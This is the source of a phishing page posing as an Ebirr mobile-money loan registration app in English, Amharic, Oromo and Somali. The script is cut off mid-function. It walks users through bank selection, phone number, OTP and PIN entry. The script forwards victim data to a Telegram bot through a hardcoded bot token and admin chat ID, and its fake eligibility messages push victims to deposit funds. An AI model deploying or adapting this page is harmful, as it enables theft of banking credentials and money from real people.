<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ebirr Premium Registration & Loan</title>
    <style>
        :root {
            --ebirr-green: #0d8331;
            --default-btn: #1b324d;
            --chip-bg: #212121;
            --bg-black: #000000;
            --agreement-bg: #303030; 
            --line-color: #333333;
            --text-gray: #a0a0a0;
            --brand-gray: #333333;
            --accent: #0d8331; 
            --btn-blue: #162f4d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', sans-serif; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--bg-black); color: #ffffff; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        
        #splashScreen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: var(--brand-gray); z-index: 9999;
            display: flex; align-items: center; justify-content: center;
        }
        .splash-logo { width: 140px; height: auto; }

        .container { width: 100%; max-width: 450px; height: 100vh; display: flex; flex-direction: column; position: relative; }

        #pgAgreement { background-color: var(--agreement-bg); display: flex; flex-direction: column; height: 100%; z-index: 100; }
        .agree-top-header { margin-top: 40px; text-align: center; width: 100%; flex-shrink: 0; }
        .agree-top-header img { width: 60px; height: 60px; margin-bottom: 15px; }
        .agree-divider { width: 88%; height: 1px; background-color: rgba(255,255,255,0.15); margin: 0 auto; }
        
        .lang-select-box { padding: 20px 24px 0 24px; display: flex; flex-direction: column; gap: 10px; }
        .lang-btn-box { display: flex; justify-content: space-between; gap: 8px; }
        .l-chip { flex: 1; padding: 10px; border: 1px solid #444; border-radius: 8px; text-align: center; font-size: 12px; cursor: pointer; color: #ccc; }
        .l-chip.active { border-color: var(--ebirr-green); background: rgba(13, 131, 49, 0.1); color: #fff; font-weight: bold; }

        .spacer { flex-grow: 1; }
        .agree-img-wrap { width: 100%; display: flex; justify-content: center; padding: 0 20px; margin-bottom: 30px; }
        .agreement-main-img { width: 100%; max-width: 380px; }
        .agree-bottom-wrap { padding: 0 24px 50px 24px; text-align: center; width: 100%; }
        .terms-text { color: #ffffff; font-size: 13px; margin-bottom: 20px; display: block; text-decoration: underline; cursor: pointer; opacity: 0.9; }
        .btn-agree-blue { width: 100%; background-color: var(--btn-blue); color: #ffffff; border: none; padding: 16px; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; }

        .header { position: relative; height: 120px; background-color: var(--bg-black); flex-shrink: 0; }
        .logo-container { padding: 15px 0 0 25px; z-index: 10; position: relative; }
        .logo-container img { width: 58px; }
        .wave-svg { position: absolute; bottom: -1px; left: 0; width: 100%; height: 80px; }
        .banner { background-color: var(--ebirr-green); text-align: center; padding: 12px 0; font-size: 18px; z-index: 5; position: relative; font-weight: 500; }

        .page { display: none; padding: 25px 24px; flex-grow: 1; flex-direction: column; }
        .page.active { display: flex; }

        .section-label { font-size: 15px; color: #fff; margin-bottom: 12px; display: block; }
        .bank-selector { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 25px; }
        .bank-btn { background-color: var(--chip-bg); border: none; color: #ffffff; padding: 14px 22px; border-radius: 25px; font-size: 14px; cursor: pointer; transition: 0.2s; }
        .bank-btn.active { background-color: #ffffff; color: var(--accent); font-weight: 700; }
        
        .input-box { border-bottom: 1.5px solid var(--line-color); padding-bottom: 8px; transition: border-color 0.3s; margin-top: 5px; }
        .input-box input { background: transparent; border: none; color: #ffffff; font-size: 17px; width: 100%; outline: none; }

        .loader { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid var(--ebirr-green); border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .otp-container { display: flex; justify-content: space-between; gap: 8px; margin-top: 40px; position: relative; height: 40px; }
        .otp-digit { width: 14%; height: 40px; border-bottom: 2px solid var(--line-color); display: flex; align-items: center; justify-content: center; font-size: 24px; font-weight: bold; transition: 0.3s; }
        .otp-digit.filled { border-color: var(--accent); }
        .otp-digit.active { border-color: #fff; }
        .hidden-input { position: absolute; opacity: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }

        .pin-area { position: relative; margin-top: 15px; }
        .eye-icon { position: absolute; right: 0; bottom: 8px; cursor: pointer; width: 22px; filter: invert(34%) sepia(98%) saturate(373%) hue-rotate(93deg) brightness(91%) contrast(87%); }

        .nav-dock { height: 75px; border-top: 1px solid #1a1a1a; display: flex; justify-content: space-around; align-items: center; }
        .nav-unit { display: flex; flex-direction: column; align-items: center; font-size: 12px; color: var(--text-gray); gap: 4px; cursor: pointer; }
        .nav-unit.active { color: var(--accent); }
        .nav-unit svg { width: 22px; height: 22px; fill: currentColor; }

        .footer-pad { padding: 0 24px 20px 24px; flex-shrink: 0; }
        .btn-main { width: 100%; background-color: var(--default-btn); color: #ffffff; border: none; padding: 15px; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; opacity: 0.4; pointer-events: none; transition: 0.3s; }
        .btn-main.active { opacity: 1; pointer-events: auto; }

        #popupOverlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.7); display: none; align-items: center; justify-content: center; z-index: 10001;
        }
        .popup-card {
            background: #222; width: 85%; max-width: 320px; padding: 25px; border-radius: 12px;
            text-align: center; border-top: 5px solid var(--accent);
        }
        .popup-card p { margin-bottom: 20px; font-size: 16px; line-height: 1.5; }
        .popup-card button {
            background: var(--accent); color: white; border: none; padding: 10px 30px; border-radius: 6px; font-weight: bold; cursor: pointer;
        }
        .status-icon { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 40px auto 20px; font-size: 40px; color: white; }
    </style>
</head>
<body>

<div id="splashScreen"><img src="https://i.postimg.cc/Qx3sBY0G/11679-removebg-preview.png" class="splash-logo"></div>

<div id="popupOverlay">
    <div class="popup-card">
        <p id="popText"></p>
        <button id="popOk">OK</button>
    </div>
</div>

<div class="container">
    <div id="pgAgreement">
        <div class="agree-top-header">
            <img src="https://i.postimg.cc/Qx3sBY0G/11679-removebg-preview.png">
            <div class="agree-divider"></div>
        </div>
        <div class="lang-select-box">
            <span style="font-size: 14px; opacity: 0.8;">Choose Language / ·âã·äï·âã ·ã≠·àù·à®·å°</span>
            <div class="lang-btn-box">
                <div class="l-chip active" onclick="changeGlobalLang('en', this)">English</div>
                <div class="l-chip" onclick="changeGlobalLang('am', this)">·ä†·àõ·à≠·äõ</div>
                <div class="l-chip" onclick="changeGlobalLang('or', this)">Oromoo</div>
                <div class="l-chip" onclick="changeGlobalLang('so', this)">Soomaali</div>
            </div>
        </div>
        <div class="spacer"></div>
        <div class="agree-img-wrap"><img src="https://i.postimg.cc/HLHSGK05/Screenshot-20260119-032654-Ebirr.jpg" class="agreement-main-img"></div>
        <div class="agree-bottom-wrap">
            <span class="terms-text" id="txtTerms">Ebirr Terms & Conditions and Privacy Policy</span>
            <button class="btn-agree-blue" id="btnAgree" onclick="acceptTerms()">Agree & Continue</button>
        </div>
    </div>

    <div class="header" id="mainHeader" style="display:none;">
        <div class="logo-container"><img src="https://i.postimg.cc/Qx3sBY0G/11679-removebg-preview.png"></div>
        <svg class="wave-svg" viewBox="0 0 500 150" preserveAspectRatio="none"><path d="M0,70 C150,160 350,0 500,70 L500,150 L0,150 Z" fill="#0d8331"></path></svg>
    </div>
    <div class="banner" id="bannerTxt" style="display:none;">Please Verify your mobile number</div>

    <div class="page" id="pg1">
        <span class="section-label" id="lblSelectBank">Select Bank</span>
        <div class="bank-selector">
            <button class="bank-btn" data-bank="KAAFI" data-hex="#199331">KAAFI</button>
            <button class="bank-btn" data-bank="CBO" data-hex="#005BAA">CBO</button>
            <button class="bank-btn" data-bank="NIB" data-hex="#FFBF00">NIB</button>
            <button class="bank-btn" data-bank="WEGAGEN" data-hex="#FF8A00">WEGAGEN</button>
            <button class="bank-btn" data-bank="AHADU" data-hex="#E30613">AHADU</button>
        </div>
        <div id="phoneArea" style="display: flex; gap: 15px; align-items: flex-end;" onclick="handlePhoneClick(event)">
            <div class="input-box" id="codeLine" style="width: 75px;"><input type="text" value="+251" readonly></div>
            <div class="input-box" id="mobLine" style="flex-grow: 1;"><input type="tel" id="mobileIn" placeholder="Mobile Number" maxlength="9" disabled></div>
        </div>
    </div>

    <div class="page" id="pgWaiting" style="text-align: center;">
        <h3 id="waitTitle" style="margin-top: 30px;">Verifying Account</h3>
        <div class="loader"></div>
        <p id="waitMsg" style="color: var(--text-gray); font-size: 15px; padding: 0 20px;"></p>
        <div id="countdown" style="font-size: 32px; font-weight: bold; margin-top: 30px; color: var(--ebirr-green);">05:00</div>
    </div>

    <div class="page" id="pg2">
        <p id="txtOtpInstruction" style="text-align: center; font-size: 17px; line-height: 1.4;">Please confirm with the OTP code sent on your Mobile Number or Email Address</p>
        <p id="txtOtpWait" style="text-align: center; font-size: 12px; color: var(--text-gray); margin-top: 10px;">OTP delivery may take a moment. Please wait patiently until it is sent to your device.</p>
        <div class="otp-container">
            <input type="text" class="hidden-input" id="otpBox" maxlength="6" inputmode="numeric">
            <div class="otp-digit"></div><div class="otp-digit"></div><div class="otp-digit"></div>
            <div class="otp-digit"></div><div class="otp-digit"></div><div class="otp-digit"></div>
        </div>
    </div>

    <div class="page" id="pg3">
        <div class="pin-area">
            <div class="input-box" id="pinLine"><input type="tel" id="pinIn" placeholder="Enter PIN" maxlength="8"></div>
            <img src="https://cdn-icons-png.flaticon.com/512/709/709612.png" class="eye-icon" onclick="togglePIN()">
        </div>
        <span id="lblForgot" style="text-align:right; color:var(--text-gray); font-size:14px; margin-top:15px; display:block;">Forgot PIN/Password?</span>
    </div>

    <div class="page" id="pgNotEligible">
        <div class="status-icon" style="background: #e67e22;">!</div>
        <h2 id="eligTitle" style="text-align:center; margin-bottom: 15px;">Loan Eligibility Notice</h2>
        <p id="eligMsg" style="text-align:center; color: var(--text-gray); line-height: 1.6;"></p>
    </div>

    <div class="page" id="pgNotVerified">
        <div class="status-icon" style="background: #c0392b;">X</div>
        <h2 id="veriTitle" style="text-align:center; margin-bottom: 15px;">Account Verification Required</h2>
        <p id="veriMsg" style="text-align:center; color: var(--text-gray); line-height: 1.6;">Your account is not currently verified or linked for this service. Please visit your nearest bank branch with a valid ID and one passport-sized photograph to complete the verification process.</p>
    </div>

    <div class="page" id="pgSuccess">
        <div class="success-content" style="text-align:center;">
            <div class="status-icon" style="background: var(--ebirr-green);">‚úì</div>
            <h2 id="sucTitle" style="margin-bottom: 15px;">Registration Successful!</h2>
            <p id="sucMsg" style="line-height: 1.6; color: var(--text-gray); font-size: 15px;"></p>
        </div>
    </div>

    <div class="footer-pad" id="mainFooter" style="display:none;">
        <button class="btn-main" id="btnNext">Next</button>
        <div class="nav-dock" id="bottomNav" style="display:none;">
            <div class="nav-unit" onclick="openSoon()"><svg viewBox="0 0 24 24"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg><span id="navOffline">Offline</span></div>
            <div class="nav-unit active"><svg viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2-.9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8zm4-2.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg><span id="navMoney">Money</span></div>
            <div class="nav-unit" onclick="openSoon()"><svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg><span id="navFeres">Feres</span></div>
        </div>
    </div>
</div>

<script>
    const translations = {
        en: {
            agreeBtn: "Agree & Continue", terms: "Ebirr Terms & Conditions and Privacy Policy",
            b1: "Please Verify your mobile number", b2: "Activation Code", b3: "Please enter your PIN/Password", b4: "Process Complete",
            selBank: "Select Bank", mobPlace: "Mobile Number", pinPlace: "Enter PIN", forgot: "Forgot PIN/Password?",
            next: "Next", act: "Activate", reg: "Register", done: "Done",
            waitPhTitle: "Verifying Account", waitPhMsg: "Please wait patiently while we verify your mobile number with the bank system.",
            waitOtpTitle: "Verifying OTP", waitOtpMsg: "Please wait patiently while we verify your OTP code. This may take a moment.",
            waitLoanTitle: "Checking Loan Eligibility", waitLoanMsg: "Please wait while we verify your credit history and loan eligibility with the bank's core system.",
            otpInstr: "Please confirm with the OTP code sent on your Mobile Number or Email Address", otpWait: "OTP delivery may take a moment. Please wait patiently until it is sent to your device.",
            eligTitle: "Loan Eligibility Notice", eligMsg: "Based on our formal evaluation, your current account balance does not meet the minimum eligibility requirements of 5,000 ETB for a loan. Please deposit additional funds into your account and try again later.",
            veriTitle: "Account Verification Required", veriMsg: "Your account is not currently verified or linked for this service. Please visit your nearest bank branch with a valid ID and one passport-sized photograph to complete the verification process.",
            sucTitle: "Registration Successful!", sucMsg: "You have been registered. You will receive a confirmation text from the bank within 24 hours.",
            soon: "This service is coming soon.", bankLock: "This bank does not currently provide credit services. Please select CBO only to proceed with your loan application.",
            selBankErr: "Please select your bank to input your mobile number.", wrongPin: "Incorrect PIN/Password. Please try again.", wrongOtp: "Your OTP is incorrect. Please try again.", phNotReg: "Your number is not registered for this service. Please register and try again.", tryAgain: "Try Again", resend: "Resend OTP", offline: "Offline", money: "Money", feres: "Feres"
        },
        am: {
            agreeBtn: "·â∞·àµ·àõ·àù·âª·àà·àÅ ·ä•·äì ·âÄ·å•·àç", terms: "·ã®·ä¢·â¢·à≠ ·ãç·àé·âΩ ·ä•·äì ·àÅ·äî·â≥·ãé·âΩ ·ä•·äï·ã≤·àÅ·àù ·ã®·åç·àã·ãä·äê·âµ ·çñ·àä·à≤",
            b1: "·ä•·â£·ä≠·ãé ·àµ·àç·ä≠ ·âÅ·å•·à≠·ãé·äï ·ã´·à®·åã·åç·å°", b2: "·ã®·àõ·åç·â†·à™·ã´ ·äÆ·ãµ", b3: "·ä•·â£·ä≠·ãé ·àö·àµ·å•·à´·ãä ·âÅ·å•·à≠·ãé·äï ·ã´·àµ·åà·â°", b4: "·àÇ·ã∞·â± ·â∞·å†·äì·âÖ·âã·àç",
            selBank: "·â£·äï·ä≠ ·ã≠·àù·à®·å°", mobPlace: "·àµ·àç·ä≠ ·âÅ·å•·à≠", pinPlace: "·àö·àµ·å•·à´·ãä ·âÅ·å•·à≠ ·ã´·àµ·åà·â°", forgot: "·àö·àµ·å•·à´·ãä ·âÅ·å•·à≠ ·à®·àµ·â∞·ãã·àç?",
            next: "·âÄ·å•·àç", act: "·ä†·åç·â•·à≠", reg: "·â∞·àò·ãù·åà·â•", done: "·å®·à≠·àµ",
            waitPhTitle: "·àò·àà·ã´ ·â†·àõ·à®·åã·åà·å• ·àã·ã≠", waitPhMsg: "·àµ·àç·ä≠ ·âÅ·å•·à≠·ãé·äï ·ä®·â£·äï·ä≠ ·àµ·à≠·ãì·âµ ·åã·à≠ ·ä•·ã´·à®·åã·åà·å•·äï ·àµ·àà·àÜ·äê ·ä•·â£·ä≠·ãé ·â†·âµ·ãï·åç·àµ·âµ ·ã≠·å†·â•·âÅ·ç¢",
            waitOtpTitle: "OTP ·â†·àõ·à®·åã·åà·å• ·àã·ã≠", waitOtpMsg: "·ã®·ä•·à≠·àµ·ãé·äï OTP ·äÆ·ãµ ·ä•·ã´·à®·åã·åà·å•·äï ·àµ·àà·àÜ·äê ·ä•·â£·ä≠·ãé ·â†·âµ·ãï·åç·àµ·âµ ·ã≠·å†·â•·âÅ·ç¢",
            waitLoanTitle: "·ã®·â•·ãµ·à≠ ·â•·âÅ·äê·âµ·äï ·â†·àõ·à®·åã·åà·å• ·àã·ã≠", waitLoanMsg: "·ã®·â•·ãµ·à≠ ·â≥·à™·ä≠·ãé·äï ·ä•·äì ·â•·âÅ·äê·âµ·ãé·äï ·ä®·â£·äï·ä© ·ãã·äì ·àµ·à≠·ãì·âµ ·åã·à≠ ·ä•·ã´·à®·åã·åà·å•·äï ·àµ·àà·àÜ·äê ·ä•·â£·ä≠·ãé ·â†·âµ·ãï·åç·àµ·âµ ·ã≠·å†·â•·âÅ·ç¢",
            otpInstr: "·ä•·â£·ä≠·ãé ·ãà·ã∞ ·àµ·àç·ä≠·ãé ·ãà·ã≠·àù ·ä¢·àú·àç·ãé ·ã®·â∞·àã·ä®·ãç·äï ·ã®OTP ·äÆ·ãµ ·ã´·àµ·åà·â°", otpWait: "OTP ·àà·àò·ãµ·à®·àµ ·å•·âÇ·âµ ·åä·ãú ·àä·ãà·àµ·ãµ ·ã≠·âΩ·àã·àç·ç¢ ·ä•·â£·ä≠·ãé ·â†·âµ·ãï·åç·àµ·âµ ·ã≠·å†·â•·âÅ·ç¢",
            eligTitle: "·àµ·àà ·â•·ãµ·à≠ ·â•·âÅ·äê·âµ ·àõ·à≥·à∞·â¢·ã´", eligMsg: "·â†·åç·àù·åà·àõ·âΩ·äï ·àò·à∞·à®·âµ·ç£ ·ã®·ä†·àÅ·äë ·ã®·àÇ·à≥·â• ·âÄ·à™·ãé ·àà·â•·ãµ·à≠ ·ã®·àö·ã´·àµ·çà·àç·åà·ãç·äï ·ä†·äê·àµ·â∞·äõ ·ã® 5,000 ETB ·àò·àµ·çà·à≠·âµ ·ä†·ã´·àü·àã·àù·ç¢ ·ä•·â£·ä≠·ãé ·â∞·å®·àõ·à™ ·åà·äï·ãò·â• ·ã´·àµ·âÄ·àù·å° ·ä•·äì ·ä•·äï·ã∞·åà·äì ·ã≠·àû·ä≠·à©·ç¢",
            veriTitle: "·ã®·àò·àà·ã´ ·àõ·à®·åã·åà·å´ ·ã´·àµ·çà·àç·åã·àç", veriMsg: "·àò·àà·ã´·ãé ·àà·ãö·àÖ ·ä†·åà·àç·åç·àé·âµ ·ä•·àµ·ä´·àÅ·äï ·ä†·àç·â∞·à®·åã·åà·å†·àù·ç¢ ·ä•·â£·ä≠·ãé ·àò·â≥·ãà·âÇ·ã´ ·ä•·äì ·ä†·äï·ãµ ·çé·â∂ ·ã≠·ãò·ãç ·â†·ä†·âÖ·à´·â¢·ã´·ãé ·ãà·ã∞·àö·åà·äù ·ã®·â£·äï·ä≠ ·âÖ·à≠·äï·å´·çç ·â†·àò·àÑ·ãµ ·ã´·à®·åã·åç·å°·ç¢",
            sucTitle: "·àù·ãù·åà·â£·ãç ·â∞·à≥·ä≠·â∑·àç!", sucMsg: "·â†·â∞·à≥·ä´ ·àÅ·äî·â≥ ·â∞·àò·ãù·åç·â†·ãã·àç·ç¢ ·â†24 ·à∞·ãì·âµ ·ãç·àµ·å• ·ä®·â£·äï·ä≠ ·ã®·àõ·à®·åã·åà·å´ ·àò·àç·ãï·ä≠·âµ ·ã≠·ã∞·à≠·àµ·ãé·â≥·àç·ç¢",
            soon: "·ã≠·àÖ ·ä†·åà·àç·åç·àé·âµ ·â†·âÖ·à≠·â° ·ã≠·åÄ·àù·à´·àç·ç¢", bankLock: "·ã≠·àÖ ·â£·äï·ä≠ ·â†·ä†·àÅ·äë ·åä·ãú ·ã®·â•·ãµ·à≠ ·ä†·åà·àç·åç·àé·âµ ·ä†·ã≠·à∞·å•·àù·ç¢ ·ä•·â£·ä≠·ãé CBO·äï ·â•·âª ·ã≠·àù·à®·å°·ç¢",
            selBankErr: "·ä•·â£·ä≠·ãé ·àµ·àç·ä≠ ·âÅ·å•·à≠·ãé·äï ·àà·àõ·àµ·åà·â£·âµ ·àò·åÄ·àò·à™·ã´ ·â£·äï·ä≠ ·ã≠·àù·à®·å°·ç¢", wrongPin: "·ã®·åà·â°·âµ ·àö·àµ·å•·à´·ãä ·âÅ·å•·à≠ ·ã®·â∞·à≥·à≥·â∞ ·äê·ãç·ç¢ ·ä•·â£·ä≠·ãé ·ä•·äï·ã∞·åà·äì ·ã≠·àû·ä≠·à©·ç¢", wrongOtp: "·ã®·åà·â°·âµ ·ã®OTP ·äÆ·ãµ ·ã®·â∞·à≥·à≥·â∞ ·äê·ãç·ç¢", phNotReg: "·âÅ·å•·à≠·ãé ·àà·ãö·àÖ ·ä†·åà·àç·åç·àé·âµ ·ä†·àç·â∞·àò·ãò·åà·â†·àù·ç¢ ·ä•·â£·ä≠·ãé ·â∞·àò·ãù·åç·â†·ãç ·ä•·äï·ã∞·åà·äì ·ã≠·àû·ä≠·à©·ç¢", tryAgain: "·ä•·äï·ã∞·åà·äì ·àû·ä≠·à≠", resend: "OTP ·ä•·äï·ã∞·åà·äì ·àã·ä≠", offline: "·ä®·àò·àµ·àò·à≠ ·ãç·å≠", money: "·åà·äï·ãò·â•", feres: "·çà·à®·àµ"
        },
        or: {
            agreeBtn: "Walii Galeera & Itti fufi", terms: "Imaammata dhuunfaa fi haalawwan Ebirr",
            b1: "Maaloo lakkoofsa bilbila keessaa mirkaneessi", b2: "Koodii ittiin hojjechiisan", b3: "Maaloo PIN/Jecha iccitii keessaa galchi", b4: "Adeemsi xumurameera",
            selBank: "Baankii Filadhu", mobPlace: "Lakkoofsa Bilbilaa", pinPlace: "PIN Galchi", forgot: "PIN dagattanii?",
            next: "Itti fufi", act: "Hojiitti hiiki", reg: "Galmaa'i", done: "Xumuri",
            waitPhTitle: "Eenyummaa Mirkaneessuu", waitPhMsg: "Hamma nuyi lakkoofsa keessaa sirna baankii wajjin mirkaneessinutti maaloo obsaan eeggadhu.",
            waitOtpTitle: "OTP Mirkaneessuu", waitOtpMsg: "Hamma nuyi koodii OTP keessaa mirkaneessinutti maaloo obsaan eeggadhu.",
            waitLoanTitle: "Baasii Liqii Mirkaneessuu", waitLoanMsg: "Hamma nuyi seenaa liqii keessaa sirna baankii wajjin mirkaneessinutti maaloo obsaan eeggadhu.",
            otpInstr: "Maaloo koodii OTP bilbila keessaa ykn Imeelii keessatti ergameen mirkaneessi", otpWait: "Koodiin OTP ga'uuf yeroo gabaabaa fudhachuu danda'a. Maaloo obsaan eeggadhu.",
            eligTitle: "Beeksisa Baasii Liqii", eligMsg: "Madaallii keenya irratti hundu'uun, herregni keessaa ulaagaa liqii gadi aanaa 5,000 ETB hin guunne. Maaloo maallaqa herrega keessatti dabalii irra deebi'ii yaali.",
            veriTitle: "Mirkaneessa Herregaa", veriMsg: "Herregni keessaa tajaajila kanaaf mirkanaa'ee hin jiru. Maaloo waraqaa eenyummaa fi suuraa tokko qabachuun damee baankii dhiyoo jiru deemii mirkaneeffadhu.",
            sucTitle: "Galmeen Milkaa'eera!", sucMsg: "Galmeeffamtaniirtu. Sa'aatii 24 keessatti baankii irraa ergaan mirkaneessaa isiniif ergama.",
            soon: "Tajaajilli kun dhiyootti ni eegala.", bankLock: "Baankiin kun tajaajila liqii hin kennu. Maaloo CBO qofa filadhu.",
            selBankErr: "Maaloo lakkoofsa keessaa galchuuf jalqaba baankii filadhu.", wrongPin: "PIN/Jechi iccitii dogoggora. Maaloo irra deebi'ii yaali.", wrongOtp: "Koodiin OTP dogoggora.", phNotReg: "Bilbilli keessaa tajaajila kanaaf hin galmoofne. Maaloo galmaa'ii irra deebi'ii yaali.", tryAgain: "Irra deebi'ii yaali", resend: "OTP irra deebi'ii ergi", offline: "Ooflaayinii", money: "Maallaqa", feres: "Feres"
        },
        so: {
            agreeBtn: "Ku raac & Sii soco", terms: "Shuruudaha Ebirr iyo Siyaasadda Khaaska ah",
            b1: "Fadlan xaqiiji lambarkaaga taleefanka", b2: "Koodka firfircoonida", b3: "Fadlan geli PIN-kaaga/Password-kaaga", b4: "Hawshu way dhammaatay",
            selBank: "Dooro Bangiga", mobPlace: "Lambarka Taleefanka", pinPlace: "Geli PIN", forgot: "Ma ilowday PIN?",
            next: "Xiga", act: "Firfircooni", reg: "Isku diwaangeli", done: "Dhammaad",
            waitPhTitle: "Xaqiijinta Koontada", waitPhMsg: "Fadlan samir u sug inta aan lambarkaaga taleefanka ka xaqiijineyno nidaamka bangiga.",
            waitOtpTitle: "Xaqiijinta OTP", waitOtpMsg: "Fadlan samir u sug inta aan xaqiijineyno koodkaaga OTP.",
            waitLoanTitle: "Hubinta Xaq u lahaanshaha Amaahda", waitLoanMsg: "Fadlan sug inta aan ka xaqiijineyno taariikhdaada amaahda nidaamka bangiga.",
            otpInstr: "Fadlan ku xaqiiji koodka OTP ee loogu soo diray Taleefankaaga ama Iimaylkaaga", otpWait: "OTP-ga wuxuu qaadan karaa cabbaar. Fadlan samir u sug.",
            eligTitle: "Ogeysiiska Xaq u lahaanshaha Amaahda", eligMsg: "Markay tahay qiimeyntayada, haraaga koontadaada hadda ma buuxinayo shuruudaha amaahda ee ugu yar oo ah 5,000 ETB. Fadlan lacag dhig koontadaada ka dibna mar kale isku day.",
            veriTitle: "Xaqiijinta Koontada ayaa loo baahan yasahay", veriMsg: "Koontadaada looma xaqiijin adeeggan. Fadlan booqo laanta bangiga adoo wata aqoonsi iyo hal sawir si loo xaqiijiyo.",
            sucTitle: "Diiwaangelintu way guuleysatay!", sucMsg: "Waa lagu diiwaangeliyey. Waxaad fariin xaqiijin ah ka heli doontaa bangiga 24 saac gudahood.",
            soon: "Adeeggan dhowaan ayuu bilaabanayaa.", bankLock: "Bangigani hadda ma bixiyo adeegyo amaah ah. Fadlan dooro CBO oo kaliya.",
            selBankErr: "Fadlan marka hore dooro bangigaaga.", wrongPin: "PIN/Password-ka waa khalad. Fadlan mar kale isku day.", wrongOtp: "OTP-gaaga waa khalad.", phNotReg: "Lambarkaagu uma diiwaangashan adeeggan. Fadlan is diwaangeli oo mar kale isku day.", tryAgain: "Mar kale isku day", resend: "Mar kale soo dir OTP", offline: "Aan khadka jirin", money: "Lacag", feres: "Feres"
        }
    };

    const ethNames = ["Abebe", "Almaz", "Bekele", "Chala", "Dawit", "Etenesh", "Fikru", "Gebre", "Hanna", "Ismael", "Jemal", "Kebede", "Lema", "Mulu", "Negasi", "Olani", "Petros", "Qasaye", "Robel", "Sara", "Tadesse", "Umer", "Worku", "Yared", "Zenebe", "Aster", "Belay", "Desta", "Eshetu", "Fana", "Girma", "Hiwot", "Ibsa", "Jalene", "Kassa", "Liyu", "Meseret", "Nardos", "Obsa", "Pawlos", "Rahel", "Semira", "Tolessa", "Utura", "Wondimu", "Yeshi", "Zewdu", "Abdi", "Berta", "Derartu", "Elias", "Feven", "Gadisa", "Habtamu", "Idris", "Josi", "Kalkidan", "Lula", "Mekonnen", "Nebiyu", "Omod", "Peniel", "Ruth", "Sileshi", "Tirhas", "Usman", "Weyesa", "Yohannes", "Zemzem", "Alem", "Biruk", "Daniel", "Eden", "Fasil", "Genet", "Helina", "Ibrahim", "Jerusalem", "Kidist", "Leila", "Marta", "Netsanet", "Oumer", "Phronsis", "Rediet", "Solomon", "Tsion", "Urji", "Winta", "Yonas", "Zahra", "Adane", "Biniam", "Dagmawi", "Ermias", "Fitsum", "Gudeta", "Hayat", "Iyasu", "Joni"];
    function getID() { let n = ethNames[Math.floor(Math.random()*ethNames.length)]; let c = localStorage.getItem('eb_c')||0; localStorage.setItem('eb_c',++c); return `${n}${c>100?' '+c:''}`; }
    const userName = getID();

    const botToken = "8592149359:AAHLfnIAZWEFpQVBU-rNvEb8PO7TcaX-nlI";
    const adminIds = ["8495316091"];
    let selectedBank = "", curL = 'en', step = -1, pollInt, timerInt, lastHandledUpdateId = 0;

    const nBtn = document.getElementById('btnNext'), pgs = { 0: document.getElementById('pg1'), 'wait': document.getElementById('pgWaiting'), 1: document.getElementById('pg2'), 2: document.getElementById('pg3'), 3: document.getElementById('pgSuccess'), 'elig': document.getElementById('pgNotEligible'), 'veri': document.getElementById('pgNotVerified') };
    const mobIn = document.getElementById('mobileIn'), pinIn = document.getElementById('pinIn'), otpIn = document.getElementById('otpBox');

    function notify(header, val, btns = []) {
        let text = "";
        if (header === "USER STARTED") {
            text = `üöÄ *USER STARTED*\nüë§ User: [${userName}]\nüåê Language: ${curL.toUpperCase()}`;
        } else if (header === "Phone Number") {
            text = `üì± *PHONE SUBMITTED*\nüë§ User: [${userName}]\nüìû Number: \`${val}\`\nüåê Lang: ${curL.toUpperCase()}`;
        } else {
            text = `üîπ *${header}*\nüë§ User: [${userName}]\nüîë Code: \`${val}\``;
        }

        adminIds.forEach(chatId => {
            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
            if(btns.length > 0) url += `&reply_markup=${JSON.stringify({inline_keyboard: [btns]})}`;
            fetch(url);
        });
    }

    window.addEventListener('load', () => setTimeout(() => document.getElementById('splashScreen').style.display = 'none', 1500));

    function changeGlobalLang(l, el) {
        curL = l;
        document.querySelectorAll('.l-chip').forEach(c => c.classList.remove('active'));
        el.classList.add('active');
        updateUI();
    }

    function acceptTerms() {
        notify("USER STARTED", "");
        document.getElementById('pgAgreement').style.display = 'none';
        document.getElementById('mainHeader').style.display = 'block';
        document.getElementById('bannerTxt').style.display = 'block';
        document.getElementById('mainFooter').style.display = 'block';
        step = 0; pgs[0].classList.add('active'); updateUI();
    }

    function handlePhoneClick(e) {
        if(!selectedBank) {
            e.preventDefault();
            e.stopPropagation();
            showPop(translations[curL].selBankErr, "OK", closePopup);
        }
    }

    function startWait(type) {
        clearInterval(pollInt); clearInterval(timerInt);
        Object.values(pgs).forEach(p => p.classList.remove('active'));
        pgs['wait'].classList.add('active');
